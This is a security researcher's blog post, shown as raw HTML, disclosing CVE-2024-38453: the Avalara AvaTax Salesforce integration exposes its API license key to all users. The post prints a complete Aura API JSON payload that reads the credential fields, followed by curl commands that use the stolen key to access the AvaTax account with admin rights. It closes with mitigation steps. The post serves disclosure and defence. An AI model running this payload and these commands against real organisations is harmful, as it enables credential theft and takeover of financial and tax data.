<!DOCTYPE html>
<html lang="en-us">
  <head>
    

<meta property="og:title" content="How Avalara for Salesforce Exposed Financial Organization Data" />
<meta property="og:description" content="CVE-2024-38453 - DNYD-2024-01
CVSS: 9.3 - AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:N
In early February I discovered an interesting Salesforce integration. This is a widely used integration that many organizations have installed as it is readily available on the store. I will explain in this blog post how insecure storage of credentials and weak permission boundaries enable attackers to not just compromise your support portal but cross scope and jump to your integrated apps, in this case Avatax." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://deneyed.com/blog/avalara/" /><meta property="article:section" content="blog" />




<meta name="description" content="Hacker minded security delivering the most effective, up-to-date SaaS and PaaS defenses. Introducing Auraql - the premier Salesforce security scanning and penetration testing platform." />
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta http-equiv="x-ua-compatible" content="ie=edge">
    <title>denEyed | Hacker Minded Security, Made Simple.</title>
    
<link rel="icon" type="image/png" href="/images/favicon.png" />
<link href="https://fonts.googleapis.com/css?family=Open&#43;Sans:400,600" rel="stylesheet">
<link rel="stylesheet" type="text/css" href="/css/style.min.04aab57686421112517bb6e9b396cf174710bea338a41efb338a55df9a5ec218.css" integrity="sha256-BKq1doZCERJRe7bps5bPF0cQvqM4pB77M4pV35pewhg=">
<link rel="stylesheet" type="text/css" href="/css/icons.css">

  </head>
  <body>
    
    
    <div id="preloader">
      <div id="status"></div>
    </div>
    

    

  
<nav class="navbar is-fresh is-transparent no-shadow" role="navigation" aria-label="main navigation">
  <div class="container">
    <div class="navbar-brand">
      <a class="navbar-item" href="/">
        <img src="/images/logos/deneyed_logo.svg" alt="" width="112" height="28">
      </a>

      <a role="button" class="navbar-burger" aria-label="menu" aria-expanded="false" data-target="navbar-menu">
        <span aria-hidden="true"></span>
        <span aria-hidden="true"></span>
        <span aria-hidden="true"></span>
      </a>
    </div>

      <div id="navbar-menu" class="navbar-menu is-static">

        <div class="navbar-end">
          <div class="navbar-item has-dropdown is-hoverable">
            <a class="navbar-link">
              Solutions
            </a>

            <div class="navbar-dropdown">
              <a href="/comingsoon/" class="navbar-item">
                Salesforce Defense
              </a>
              <a href="/comingsoon/" class="navbar-item">
                Offensive Security
              </a>
            </div>
          </div>
          <div class="navbar-item has-dropdown is-hoverable">
            <a class="navbar-link">
              Resources
            </a>

            <div class="navbar-dropdown">
              <a href="/comingsoon/" class="navbar-item">
                Docs
              </a>
              <a href="/comingsoon/" class="navbar-item">
                FAQ
              </a>
            </div>
          </div>
          <div class="navbar-item has-dropdown is-hoverable">
            <a class="navbar-link">
              Company
            </a>

            <div class="navbar-dropdown">
              <a href="/comingsoon/" class="navbar-item">
                Why denEyed?
              </a>
              <a href="/comingsoon/" class="navbar-item">
                About Us
              </a>
            </div>
          </div>
          <a href="/posts/" class="navbar-item is-secondary">
            Blog
          </a>
          <a href="https://appexchange.salesforce.com/appxListingDetail?listingId=67ac7524-8248-4701-87d1-50e8e84951af" class="navbar-item">
            <span class="button signup-button rounded secondary-btn raised">
              Get Started
            </span>
          </a>
        </div>
      </div>
  </div>
</nav>


<nav id="navbar-clone" class="navbar is-fresh is-transparent" role="navigation" aria-label="main navigation">
  <div class="container">
    <div class="navbar-brand">
      <a class="navbar-item" href="/">
        <img src="/images/logos/deneyed_logo.svg" alt="" width="112" height="28">
      </a>

      <a role="button" class="navbar-burger" aria-label="menu" aria-expanded="false" data-target="cloned-navbar-menu">
        <span aria-hidden="true"></span>
        <span aria-hidden="true"></span>
        <span aria-hidden="true"></span>
      </a>
    </div>

    <div id="cloned-navbar-menu" class="navbar-menu is-fixed">

      <div class="navbar-end">
        <div class="navbar-item has-dropdown is-hoverable">
          <a class="navbar-link">
            Solutions
          </a>

          <div class="navbar-dropdown">
            <a href="/comingsoon/" class="navbar-item">
              Salesforce Defense
            </a>
            <a href="/comingsoon/" class="navbar-item">
              Offensive Security
            </a>
          </div>
        </div>
        <div class="navbar-item has-dropdown is-hoverable">
          <a class="navbar-link">
            Resources
          </a>

          <div class="navbar-dropdown">
            <a href="/comingsoon/" class="navbar-item">
              Docs
            </a>
            <a href="/comingsoon/" class="navbar-item">
              FAQ
            </a>
          </div>
        </div>
        <div class="navbar-item has-dropdown is-hoverable">
          <a class="navbar-link">
            Company
          </a>

          <div class="navbar-dropdown">
            <a href="/comingsoon/" class="navbar-item">
              Why denEyed?
            </a>
            <a href="/comingsoon/" class="navbar-item">
              About Us
            </a>
          </div>
        </div>
        <a href="/posts/" class="navbar-item is-secondary">
          Blog
        </a>
        <a href="https://appexchange.salesforce.com/appxListingDetail?listingId=67ac7524-8248-4701-87d1-50e8e84951af" class="navbar-item">
          <span class="button signup-button rounded secondary-btn raised">
            Get Started
          </span>
        </a>
      </div>
    </div>
</div>
</nav>

<section class="section is-medium">
  <div class="container">
    <div class="columns">
      <div class="column is-centered-tablet-portrait">
        <h1 class="title section-title">How Avalara for Salesforce Exposed Financial Organization Data</h1>
        <h5 class="subtitle is-5 is-muted">June 2024, by Andrew Schoonmaker</h5>
        <div class="divider"></div>
      </div>
    </div>

    <div class="content">
      <p><strong>CVE-2024-38453 - DNYD-2024-01</strong><br>
<strong>CVSS:</strong> 9.3 - AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:N</p>
<p>In early February I discovered an interesting Salesforce integration. This is a widely used integration that many organizations have installed as it is readily available on the store. I will explain in this blog post how insecure storage of credentials and weak permission boundaries enable attackers to not just compromise your support portal but cross scope and jump to your integrated apps, in this case Avatax.</p>
<p>Avatax is a product provided by Avalara to integrate into your Salesforce org and automate all kinds of billing and tax data, even going so far as to handle your tax calculations and enterprise nexus registrations with the push of a button. This also means every single customer flows through the system. Think: Banking, Tax Data, Invoice Data, all needs to be present to authorize the Avatax platform to handle your taxes. Access to this is like your crown jewels.</p>
<p>According to <a href="https://knowledge.avalara.com/bundle/zla1653454363082/page/Install_Connector_for_Salesforce_CPQ.html">the installation documentation</a>, we could see 2 things:</p>
<ol>
<li>The License Key and Account Number are stored in a custom setting.</li>
<li>The app installation recommends installing for all users.</li>
</ol>
<p>It’s time to look at the Avatax API, how does authentication work?<br>
<a href="https://developer.avalara.com/avatax/authentication-in-rest/">https://developer.avalara.com/avatax/authentication-in-rest/</a></p>
<p><img src="/images/blog/avalara-docs.png" alt="Avalara docs"></p>
<p>This page tells us a lot. We’ve learned 3 more things:</p>
<ol>
<li>The API accepts Basic authentication with the account ID : license key combo.</li>
<li>This API session is admin permissioned.</li>
<li>It’s basically indistinguishable from anyone else.</li>
</ol>
<p>Putting it all together, this Custom Setting is a juicy target. It’s got everything we need to take over the Avatax account.</p>
<p>Here’s how we did it: Once we have a session on the Salesforce site, we are within that permission boundary installed to all users and can look for an aura-enabled request to intercept. Usually, you can find one hitting <code>/s/sfsites/aura</code>.</p>
<p><img src="/images/blog/avalara-burp.png" alt="Avalara Burp"></p>
<p>You can see in this screenshot, we can read all the fields on the record when we use the aura API to read the custom setting.
Attached below is the payload, you only need to update the message parameter which Salesforce expects to be JSON and URL Encoded.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;actions&#34;</span>: [
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;id&#34;</span>: <span style="color:#e6db74">&#34;222;a&#34;</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;descriptor&#34;</span>: <span style="color:#e6db74">&#34;aura://RecordUiController/ACTION$getRecordsWithFields&#34;</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;callingDescriptor&#34;</span>: <span style="color:#e6db74">&#34;UNKNOWN&#34;</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;params&#34;</span>: {
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;recordIds&#34;</span>:[<span style="color:#e6db74">&#34;**RECORDID**&#34;</span>],
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;fields&#34;</span>:[<span style="color:#e6db74">&#34;AVA_SFCPQ__AvaTaxQuoteQuicklySettings__c.AVA_SFCPQ__A_AccountNumber__c&#34;</span>,<span style="color:#e6db74">&#34;AVA_SFCPQ__AvaTaxQuoteQuicklySettings__c.AVA_SFCPQ__B_LicenseKey__c&#34;</span>,<span style="color:#e6db74">&#34;AVA_SFCPQ__AvaTaxQuoteQuicklySettings__c.AVA_SFCPQ__C_Sandbox__c&#34;</span>,<span style="color:#e6db74">&#34;AVA_SFCPQ__AvaTaxQuoteQuicklySettings__c.AVA_SFCPQ__D_CompanyCode__c&#34;</span>,<span style="color:#e6db74">&#34;AVA_SFCPQ__AvaTaxQuoteQuicklySettings__c.AVA_SFCPQ__Disable_AvaTax_Triggers__c&#34;</span>,<span style="color:#e6db74">&#34;AVA_SFCPQ__AvaTaxQuoteQuicklySettings__c.AVA_SFCPQ__E_Street__c&#34;</span>,<span style="color:#e6db74">&#34;AVA_SFCPQ__AvaTaxQuoteQuicklySettings__c.AVA_SFCPQ__Enable_AvaTax_Exemptions__c&#34;</span>,<span style="color:#e6db74">&#34;AVA_SFCPQ__AvaTaxQuoteQuicklySettings__c.AVA_SFCPQ__F_City__c&#34;</span>,<span style="color:#e6db74">&#34;AVA_SFCPQ__AvaTaxQuoteQuicklySettings__c.AVA_SFCPQ__G_State__c&#34;</span>,<span style="color:#e6db74">&#34;AVA_SFCPQ__AvaTaxQuoteQuicklySettings__c.AVA_SFCPQ__H_PostalCode__c&#34;</span>,<span style="color:#e6db74">&#34;AVA_SFCPQ__AvaTaxQuoteQuicklySettings__c.AVA_SFCPQ__I_Country__c&#34;</span>,<span style="color:#e6db74">&#34;AVA_SFCPQ__AvaTaxQuoteQuicklySettings__c.AVA_SFCPQ__JA_SaveTransactionsToAvaTax__c&#34;</span>,<span style="color:#e6db74">&#34;AVA_SFCPQ__AvaTaxQuoteQuicklySettings__c.AVA_SFCPQ__J_EnableTaxCalculation__c&#34;</span>,<span style="color:#e6db74">&#34;AVA_SFCPQ__AvaTaxQuoteQuicklySettings__c.AVA_SFCPQ__K_EnableAddressValidation__c&#34;</span>,<span style="color:#e6db74">&#34;AVA_SFCPQ__AvaTaxQuoteQuicklySettings__c.AVA_SFCPQ__L_Note__c&#34;</span>,<span style="color:#e6db74">&#34;AVA_SFCPQ__AvaTaxQuoteQuicklySettings__c.AVA_SFCPQ__Street_2__c&#34;</span>,<span style="color:#e6db74">&#34;AVA_SFCPQ__AvaTaxQuoteQuicklySettings__c.AVA_SFCPQ__Street_3__c&#34;</span>,<span style="color:#e6db74">&#34;AVA_SFCPQ__AvaTaxQuoteQuicklySettings__c.CloneSourceId&#34;</span>,<span style="color:#e6db74">&#34;AVA_SFCPQ__AvaTaxQuoteQuicklySettings__c.CreatedById&#34;</span>,<span style="color:#e6db74">&#34;AVA_SFCPQ__AvaTaxQuoteQuicklySettings__c.CreatedDate&#34;</span>,<span style="color:#e6db74">&#34;AVA_SFCPQ__AvaTaxQuoteQuicklySettings__c.CurrencyIsoCode&#34;</span>,<span style="color:#e6db74">&#34;AVA_SFCPQ__AvaTaxQuoteQuicklySettings__c.Id&#34;</span>,<span style="color:#e6db74">&#34;AVA_SFCPQ__AvaTaxQuoteQuicklySettings__c.IsDeleted&#34;</span>,<span style="color:#e6db74">&#34;AVA_SFCPQ__AvaTaxQuoteQuicklySettings__c.LastModifiedById&#34;</span>,<span style="color:#e6db74">&#34;AVA_SFCPQ__AvaTaxQuoteQuicklySettings__c.LastModifiedDate&#34;</span>,<span style="color:#e6db74">&#34;AVA_SFCPQ__AvaTaxQuoteQuicklySettings__c.Name&#34;</span>,<span style="color:#e6db74">&#34;AVA_SFCPQ__AvaTaxQuoteQuicklySettings__c.SetupOwnerId&#34;</span>,<span style="color:#e6db74">&#34;AVA_SFCPQ__AvaTaxQuoteQuicklySettings__c.SystemModstamp&#34;</span>]
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  ]
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p><br>In the response, we can read <strong>AVA_SFCPQ__B_LicenseKey__c</strong> and <strong>AVA_SFCPQ__A_AccountNumber__c</strong>.</p>
<p>All we need to do now is hit the API with cURL and “I’m in!”</p>
<p>Here are a couple of requests I used to demonstrate the impact while I walked around the Avatax account with full admin permission!</p>
<p>curl &lsquo;<a href="https://acctid:licensekey@rest.avatax.com/api/v2/users'">https://acctid:<span class="__cf_email__" data-cfemail="0c60656f69627f696769754c7e697f78226d7a6d786d74226f6361">[email&#160;protected]</span>/api/v2/users'</a> | jq<br>
curl &lsquo;<a href="https://acctid:licensekey@rest.avatax.com/api/v2/companies'">https://acctid:<span class="__cf_email__" data-cfemail="3f53565c5a514c5a545a467f4d5a4c4b115e495e4b5e47115c5052">[email&#160;protected]</span>/api/v2/companies'</a> | jq</p>
<p>If you really want to push it to the limit, you can read their <a href="https://developer.avalara.com/api-reference/avatax/rest/v2/">API docs here</a></p>
<p>Lastly, mitigation for this should involve at a minimum 3 steps:</p>
<ul>
<li>Upgrade the app integration to the latest version.</li>
<li>Rotate the license key immediately.</li>
<li>Review activity logs on both cloud environments for anomalous activity.</li>
</ul>
<p>You may want to check out our tool <a href="https://appexchange.salesforce.com/appxListingDetail?listingId=67ac7524-8248-4701-87d1-50e8e84951af">AuraQL</a> which can help analyze your org for these kinds of findings, it is important to remember that even your custom apps can expose you to risk if your permission boundary isn’t tightly controlled.</p>
<a href="https://appexchange.salesforce.com/appxListingDetail?listingId=67ac7524-8248-4701-87d1-50e8e84951af" class="navbar-item">
            <span class="button signup-button rounded secondary-btn raised">
              Get Started
            </span>
          </a>
    </div>
  </div>
</section>



  

  



    
    <div id="backtotop"><a href="#"></a></div>

    <script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.1/jquery.min.js"></script>
<script src="https://unpkg.com/feather-icons"></script>
<script src="/js/fresh.js"></script>
<script src="/js/jquery.panelslider.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/modernizr/2.8.3/modernizr.min.js"></script>

  </body>
</html>
